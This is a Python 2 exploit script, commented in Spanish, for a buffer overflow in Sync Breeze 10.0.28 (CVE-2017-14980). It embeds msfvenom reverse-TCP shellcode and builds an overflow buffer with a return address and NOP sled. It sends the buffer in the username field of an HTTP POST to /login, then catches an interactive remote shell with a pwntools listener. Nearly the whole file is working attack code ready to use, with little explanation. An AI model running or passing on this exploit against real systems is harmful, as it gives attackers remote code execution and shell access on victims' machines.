#!/usr/bin/python
# -*- coding: utf-8 -*-
#Exploit para Sync Breeze v10.0.28
#CVE-2017-14980


import socket
import sys
from pwn import *
from time import sleep
import os


def payload():
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.202 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -v shell
    shell =  b""                                                                                                
    shell += b"\xba\x29\xd2\xbe\xc5\xdb\xc7\xd9\x74\x24\xf4\x5f"                                                
    shell += b"\x33\xc9\xb1\x52\x83\xc7\x04\x31\x57\x0e\x03\x7e"                                                
    shell += b"\xdc\x5c\x30\x7c\x08\x22\xbb\x7c\xc9\x43\x35\x99"                                                
    shell += b"\xf8\x43\x21\xea\xab\x73\x21\xbe\x47\xff\x67\x2a"                                                
    shell += b"\xd3\x8d\xaf\x5d\x54\x3b\x96\x50\x65\x10\xea\xf3"                                                
    shell += b"\xe5\x6b\x3f\xd3\xd4\xa3\x32\x12\x10\xd9\xbf\x46"                                                
    shell += b"\xc9\x95\x12\x76\x7e\xe3\xae\xfd\xcc\xe5\xb6\xe2"                                                
    shell += b"\x85\x04\x96\xb5\x9e\x5e\x38\x34\x72\xeb\x71\x2e"                                                
    shell += b"\x97\xd6\xc8\xc5\x63\xac\xca\x0f\xba\x4d\x60\x6e"                                                
    shell += b"\x72\xbc\x78\xb7\xb5\x5f\x0f\xc1\xc5\xe2\x08\x16"                                                
    shell += b"\xb7\x38\x9c\x8c\x1f\xca\x06\x68\xa1\x1f\xd0\xfb"                                                
    shell += b"\xad\xd4\x96\xa3\xb1\xeb\x7b\xd8\xce\x60\x7a\x0e"                                                
    shell += b"\x47\x32\x59\x8a\x03\xe0\xc0\x8b\xe9\x47\xfc\xcb"                                                
    shell += b"\x51\x37\x58\x80\x7c\x2c\xd1\xcb\xe8\x81\xd8\xf3"                                                
    shell += b"\xe8\x8d\x6b\x80\xda\x12\xc0\x0e\x57\xda\xce\xc9"                                                
    shell += b"\x98\xf1\xb7\x45\x67\xfa\xc7\x4c\xac\xae\x97\xe6"                                                
    shell += b"\x05\xcf\x73\xf6\xaa\x1a\xd3\xa6\x04\xf5\x94\x16"                                                
    shell += b"\xe5\xa5\x7c\x7c\xea\x9a\x9d\x7f\x20\xb3\x34\x7a"                                                
    shell += b"\xa3\x7c\x60\x85\xf9\x15\x73\x85\xfc\x5e\xfa\x63"                                                
    shell += b"\x94\xb0\xab\x3c\x01\x28\xf6\xb6\xb0\xb5\x2c\xb3"                                                
    shell += b"\xf3\x3e\xc3\x44\xbd\xb6\xae\x56\x2a\x37\xe5\x04"                                                
    shell += b"\xfd\x48\xd3\x20\x61\xda\xb8\xb0\xec\xc7\x16\xe7"                                                
    shell += b"\xb9\x36\x6f\x6d\x54\x60\xd9\x93\xa5\xf4\x22\x17"                                                
    shell += b"\x72\xc5\xad\x96\xf7\x71\x8a\x88\xc1\x7a\x96\xfc"                                                
    shell += b"\x9d\x2c\x40\xaa\x5b\x87\x22\x04\x32\x74\xed\xc0"                                                
    shell += b"\xc3\xb6\x2e\x96\xcb\x92\xd8\x76\x7d\x4b\x9d\x89"                                                
    shell += b"\xb2\x1b\x29\xf2\xae\xbb\xd6\x29\x6b\xcb\x9c\x73"                                                
    shell += b"\xda\x44\x79\xe6\x5e\x09\x7a\xdd\x9d\x34\xf9\xd7"                                                
    shell += b"\x5d\xc3\xe1\x92\x58\x8f\xa5\x4f\x11\x80\x43\x6f"                                                
    shell += b"\x86\xa1\x41"
    return shell
    

def buffer(lg2):
    codigo = payload()
    lg2.status("Leyendo payload")
    return "A"*780+'\x83\x0C\x09\x10'+ '\x90'*20+codigo+'\x90'*(1500-780-4-20-len(codigo))



def post(host):
    lg2 = log.progress("Cargando codigos")
    lg2.status("Cargando sentencia de desbordamiento")
    lgn="username="+buffer(lg2)+"&password=A"
    lg2.status("Generando petición POST")
    sleep(1)
    pld=""
    pld+="POST /login HTTP/1.1\r\n"
    pld+="Host: %s \r\n" % str(host)
    pld+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    pld+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    pld+="Accept-Language: en-US,en;q=0.5\r\n"
    pld+="Accept-Encoding: gzip, deflate\r\n"
    pld+="Content-Type: application/x-www-form-urlencoded\r\n"
    pld+="Content-Length: " + str(len(lgn)) + "\r\n"
    pld+="Origin: http://%s\r\n" % str(host)
    pld+="Connection: keep-alive\r\n"
    pld+="Referer: http://%s/login\r\n" % str(host)
    pld+="Upgrade-Insecure-Requests: 1\r\n"
    pld+="\r\n"
    pld+=lgn
    lg2.success("Payload listo:")
    return pld


def cabecera():
    print "________                               ________                                 "
    print "__  ___/_____  _________ _______       ___  __ )_____________ _____ ___________ "
    print "_____ \ __  / / /__  __ \_  ___/       __  __  |__  ___/_  _ \_  _ \___  /_  _ \\"
    print "____/ / _  /_/ / _  / / // /__         _  /_/ / _  /    /  __//  __/__  /_/  __/"
    print "/____/  _\__, /  /_/ /_/ \___/         /_____/  /_/     \___/ \___/ _____/\___/"
    print "        /____/                                                                  "
    print "                                                                       v 10.0.28"
    print "________________________________________________________________________________"
    print "\n"

if __name__ == '__main__':
    cabecera()
    print "Exploit para Sync Breeze 10.0.28"
    print "Desarrollado por L0H\n"
    lg = log.progress("Inicializando")
    lg.status("Preparando requisitos")
    sleep(1)
    lg.status("Esperando parametros")
    host = str(raw_input("[?] Introduce la dirección IP de la maquina: ").replace('\n', ''))
    port=int(input("[?] Introduce el puerto del portal (80 por defecto): "))
    l_port=int(input("[?] Introduce el puerto por el que se establecera la conexión: "))
    selec = raw_input("[?] Si quieres ver el payload introduce \"[y/Y]\" ").replace('\n', '')
    print "________________________________________________________________________________"
    print "[*] Dirección IP atcada: " + host + "\n[*] Puerto: " + str(port) + "\n[*] Puerto para la conexión remota: " + str(l_port)
    lg.status("Comprobando conexión")
    sleep(2)
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn.connect((host, port))
    except:
        lg.failure("Conexión fallida, revise los ajustes")
        exit()
    lg.success("Conexión establecida")
    atq = post(host)
    if(selec == 'y' or selec == 'Y'): print atq
    lg3 = log.progress("Reverse Shell")
    lg3.status("Preparando")
    sleep(1)
    lg3.success("Listo")
    iss = listen(l_port)
    conn.send(atq)
    iss.interactive()
    conn.close()





